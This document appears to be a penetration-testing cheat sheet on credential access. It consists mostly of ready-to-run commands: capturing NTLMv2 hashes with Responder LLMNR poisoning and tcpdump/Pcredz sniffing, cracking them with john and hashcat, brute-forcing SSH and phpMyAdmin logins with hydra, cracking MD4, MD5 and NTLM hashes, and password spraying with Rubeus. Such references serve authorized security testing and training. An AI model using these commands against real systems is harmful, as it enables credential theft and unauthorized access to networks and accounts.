# Credential Access

### Obtain and Crack an NTLMv2 Challenge/Response Using Responder and John
SAM and NTDS.dit files contain unsalted MD4 hashes and are used in NTLMv1 challenge/responses. These hashes can be used in Pass-the-Hash attacks. NTLMv2 challenge/responses cannot. 
```bash
sudo Responder.py -I eth0 
# wait for Responder to reply to a LLMNR request 
# then, check Responder's log directory for the NTLMv2 hash obtained 
cat responder/logs/SMB-NTLMv2-SSP-*.txt
john --format=netntlmv2 responder/logs/SMB-NTLMv2-SSP-*.txt # crack the hash
john --show responder/logs/SMB-NTLMv2-SSP*.txt              # show the password
```

### Sniff and Crack an NTLMv2 Challenge/Response Using Tcpdump, Pcredz, and Hashcat
```bash
sudo tcpdump -ni eth0 port 445 -w /tmp/traffic.pcap
# wait for someone to auth via SMB to a Windows machine
sudo Pcredz -vf traffic.pcap
# use /tmp to avoid a segmentation fault
# check Pcredz's log directory for the NTLMv2 hash obtained
cat pcredz/logs/NTLMv2.txt
hashcat -a0 -m5600 -w3 pcredz/logs/NLTMV2.txt                   # crack the hash
hashcat -m5600 pcredz/logs/NTLMv2.txt --show --outfile-format 2 # show the password
```

### Using smbclient to Authenticate via SMB
```bash
smbclient //192.168.1.69/c$ -U victor password123
# NT_STATUS_ACCESS_DENIED may indicate the credentials are wrong or SMB access is restricted
```

## Password Guessing
### Hydra
**SSH**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
```

**HTTP** (e.g., PHP login page)
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```

## Password Cracking
### PCredz
```bash
sudo tcpdump -ni eth0 -w ntlm.pcap
python ./Pcredz -f ntlm.pcap 
hashcat -a0 -w3 -m5600 NTLMv2.txt /usr/share/wordlists/rockyou.txt
john NTLMv2.txt
```

### Hashcat
**MD4**
```bash
hashcat -m 900 -a 0 hash.txt rockyou.txt
hashcat -m 900 -a 3 hash.txt ?l?l?l?l?l?l?l?l?l?l # brute force, 10 chars
hashcat -m 900 -a 3 -1 ?l?u?d hash.txt ?1?1?1?1?1 # lower, upper, decimal
hashcat -m 900 hash.txt rockyou.txt -r /opt/hashcat/rules/best64.rule
```

**MD5**
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**NTLM**
```bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
```

## Password Spraying
### Rubeus
```bash
rubeus.exe brute /password:Password1 /noticket
```